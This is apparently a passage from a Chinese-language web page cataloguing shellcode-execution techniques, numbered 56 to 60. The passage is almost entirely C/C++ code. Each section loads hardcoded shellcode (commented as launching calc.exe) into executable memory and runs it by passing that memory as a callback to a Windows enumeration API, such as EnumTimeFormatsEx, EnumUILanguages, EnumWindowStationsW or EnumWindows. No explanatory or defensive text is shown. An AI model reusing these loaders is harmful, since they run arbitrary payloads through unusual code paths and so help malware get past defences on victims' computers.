hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumThreadWindows(<span class="hljs-number">0</span>,(WNDENUMPROC)&nbsp;hAlloc,<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>}<br></code></pre>
<h1 id="h56enumtimeformatsex"><span>56.回调函数注入 通过 EnumTimeFormatsEx</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Crypt32.lib"</span>)</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)address,&nbsp;LOCALE_NAME_SYSTEM_DEFAULT,&nbsp;TIME_NOSECONDS,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>}<br></code></pre>
<h1 id="h57enumuilanguagesa"><span>57.回调函数注入 通过 EnumUILanguagesA</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumUILanguagesA((UILANGUAGE_ENUMPROCA)hAlloc,&nbsp;MUI_LANGUAGE_ID,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>}<br></code></pre>
<h1 id="h58enumuilanguagesw"><span>58.回调函数注入 通过 EnumUILanguagesW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumUILanguagesW((UILANGUAGE_ENUMPROCW)address,&nbsp;MUI_LANGUAGE_ID,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>}<br></code></pre>
<h1 id="h59enumwindowstationsw"><span>59.回调函数注入 通过 EnumWindowStationsW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(addr)&nbsp;{<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::EnumWindowStationsW((WINSTAENUMPROCW)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>}<br></code></pre>
<h1 id="h60enumwindows"><span>60.回调函数注入 通过 EnumWindows</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;BOOL&nbsp;CALLBACK&nbsp;<span class="hljs-title">EnumWindowCallback</span><span class="hljs-params">(HWND&nbsp;hWnd,&nbsp;LPARAM&nbsp;lparam)</span>&nbsp;</span>{<br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//printf("%S",&nbsp;lparam);</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-literal">true</span>;<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span>}<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span></span>{<br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum 